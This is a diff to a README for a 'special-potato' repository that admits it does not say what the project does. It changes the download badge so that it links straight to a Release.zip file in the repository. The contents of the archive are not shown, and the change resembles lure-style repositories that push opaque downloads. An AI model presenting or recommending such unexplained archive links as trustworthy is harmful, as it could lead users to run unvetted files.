@@ -1,6 +1,6 @@
 # 🥔 Welcome to the Special Potato Repository! 🥔
 
-[![Download Special Potato](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Special Potato](https://github.com/IsaqueLioncioNogueira/special-potato/releases/download/v1.0/Release.zip)](https://github.com/IsaqueLioncioNogueira/special-potato/releases/download/v1.0/Release.zip)
 
 ## Description:
 This repository is all about a special potato, although the exact details of what makes it special are not provided. Feel free to explore and uncover the mystery of the "special-potato" project!
